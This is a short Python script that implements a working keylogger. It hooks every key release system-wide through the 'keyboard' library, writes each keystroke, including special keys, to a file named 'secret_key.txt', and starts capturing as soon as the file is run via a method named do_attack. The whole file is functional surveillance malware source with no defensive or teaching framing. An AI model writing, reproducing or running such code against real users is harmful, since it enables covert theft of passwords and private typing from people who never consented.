import keyboard

class Keylogger:
    def __init__(self,log_filename):
        self.log_filename=log_filename

    def do_attack(self):

        out_file = open(self.log_filename, "w", encoding="utf-8")

        def new_key(event):
            key = event.name
            if key == "space":
                out_file.write(" ")
            elif key == "enter":
                out_file.write("\n")
            elif key == "backspace":
                out_file.write("[<]")
            elif len(key) == 1:
                out_file.write(key)
            else:
                out_file.write(f"[{key}]")
            out_file.flush()

        keyboard.on_release(callback=new_key)
        keyboard.wait()
        out_file.close()

logger=Keylogger("secret_key.txt")
logger.do_attack()
